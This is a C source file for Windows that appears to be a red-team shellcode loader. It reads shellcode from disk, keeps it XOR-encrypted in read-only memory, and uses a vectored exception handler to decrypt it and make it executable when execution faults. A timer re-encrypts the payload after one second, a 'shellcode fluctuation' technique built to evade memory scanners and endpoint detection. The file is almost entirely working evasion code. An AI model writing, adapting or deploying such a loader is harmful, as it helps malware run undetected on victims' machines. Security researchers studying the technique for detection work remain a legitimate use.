#include <Windows.h>

#include "common.h"

// XOR key
BYTE bKey = 0x41;

// Timer variables
HANDLE g_hTimer = NULL;
HANDLE g_hTimerQueue = NULL;
PBYTE g_pShellcode = NULL;
SIZE_T g_sShellcodeSize = 0;

LPVOID VC_PREF_BASES[] = {
    (LPVOID)0x10000000,
    (LPVOID)0x20000000,
    (LPVOID)0x30000000,
    (LPVOID)0x40000000,
    (LPVOID)0x50000000
};

// Memcpy CRT replacement
void* MoveMem(void* dest, const void* src, unsigned int count) {
    unsigned char* dst8 = (unsigned char*)dest;
    const unsigned char* src8 = (const unsigned char*)src;

    while (count--) {
        *dst8++ = *src8++;
    }

    return dest;
}

unsigned char* ReadShellcode(const char* fileName, DWORD* dwSize) {
    HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return NULL;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        return NULL;
    }
    *dwSize = fileSize;

    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (!buffer) {
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        free(buffer);
        CloseHandle(hFile);
        return NULL;
    }
    CloseHandle(hFile);
    return buffer;
}


LPVOID GetShellcodeBaseAddress(HANDLE hHandle, DWORD szPage, DWORD stReservationGran, DWORD dwReservationBlocks){
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T mbiSize = sizeof(MEMORY_BASIC_INFORMATION);

    for (int b = 0; b < sizeof(VC_PREF_BASES) / sizeof(VC_PREF_BASES[0]); ++b) {
        LPVOID base = VC_PREF_BASES[b];

        if (VirtualQueryEx(hHandle, base, &mbi, mbiSize) == 0)
            continue;

        if (mbi.State == MEM_FREE) {
            DWORD i;
            for (i = 0; i < dwReservationBlocks; ++i) {
                LPVOID currentBase = (LPVOID)((uintptr_t)base + (i * stReservationGran));

                if (VirtualQueryEx(hHandle, currentBase, &mbi, mbiSize) == 0 || mbi.State != MEM_FREE)
                    break;
            }

            if (i == dwReservationBlocks) {
                return base;
            }
        }
    }

    return NULL;
}

// The XOR function
VOID XorByiKeys(PBYTE buf, SIZE_T size, BYTE bKey) {
    for (size_t i = 0; i < size; i++) {
        buf[i] = buf[i] ^ (bKey + i);
    }
}

VOID CALLBACK ReEncryptShellcodeCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired) {
    PRINTA("[*] Timer triggered! Re-encrypting shellcode and setting to RO...\n");

    // Re-encrypt shellcode
    XorByiKeys(g_pShellcode, g_sShellcodeSize, bKey);

    // Set memory protection back to Read-Only
    DWORD oldProtect;
    VirtualProtect(g_pShellcode, g_sShellcodeSize, PAGE_READONLY, &oldProtect);

    PRINTA("[+] Shellcode re-encrypted successfully.\n");
}

// Temp VEH handler function
LONG WINAPI VectoredExceptionHandler(EXCEPTION_POINTERS* pExceptionInfo) {
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        PRINTA("\t[!] VEH: Exception Caught!\n");

        // Modify memory protection to allow decryption
        DWORD oldProtect;
        VirtualProtect(pExceptionInfo->ExceptionRecord->ExceptionInformation[1], g_sShellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);

        // Decrypt the shellcode
        PRINTA("\t[+] Decrypting Shellcode...\n");
        XorByiKeys((PBYTE)pExceptionInfo->ExceptionRecord->ExceptionInformation[1], g_sShellcodeSize, bKey);


        // Start the timer to re-encrypt the shellcode after 1 seconds
        if (!CreateTimerQueueTimer(&g_hTimer, g_hTimerQueue, (WAITORTIMERCALLBACK)ReEncryptShellcodeCallback, NULL, 1000, 0, 0)) {
            PRINTA("[!] Timer setup failed!\n");
        }

        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}


BOOL FluctuateShellcode(IN PBYTE pShellcodeBuffer, IN DWORD dwSize) {
   
    // Save variables
    g_pShellcode = (PBYTE)pShellcodeBuffer;
    g_sShellcodeSize = dwSize;

    // Create a timer queue
    if (!(g_hTimerQueue = CreateTimerQueue())) {
        PRINTA("[!] Failed to create timer queue.\n");
        return FALSE;
    }
    
    // Register VEH
    if (AddVectoredExceptionHandler(0x01, VectoredExceptionHandler)) {
        PRINTA("[!] Succesfully Installed VEH.\n");
    }

    // Set memory to RO
    DWORD oldProtect;
    if (VirtualProtect(pShellcodeBuffer, dwSize, PAGE_READONLY, &oldProtect)) {
        PRINTA("[!] Succesfully Changed Memory To PAGE_READONLY.\n");
    }


    // Trigger Execution (which should causes EXCEPTION_ACCESS_VIOLATION)
    PRINTA("[*] Triggering shellcode execution...\n");
    ((void(*)())pShellcodeBuffer)();
}